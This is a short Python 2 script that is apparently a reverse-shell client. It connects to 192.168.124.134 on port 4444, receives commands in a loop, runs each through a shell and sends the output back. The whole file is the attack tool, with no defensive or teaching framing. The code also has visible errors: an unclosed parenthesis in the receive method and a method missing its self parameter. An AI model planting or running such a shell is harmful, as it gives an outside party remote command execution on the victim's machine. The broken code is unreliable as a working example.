#!/usr/bin/env python2
from socket import SOCK_STREAM, socket
import socket
import subprocess

class Connect:
    def __init__(self, ip, port ):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def send(self, command):
        self.connection.send(command)
    def recieve(self):
        return self.connection.recv(2048

    def exec_cmd(command):
        return subprocess.check_output(command, shell=True)
    
    def execute(self):
        while True:
            cmd = self.recieve()
            cmd_result = self.exec_cmd(cmd)
            self.send(cmd_result)
        self.connection.close()
        
        

con = Connect("192.168.124.134", 4444)
con.execute()
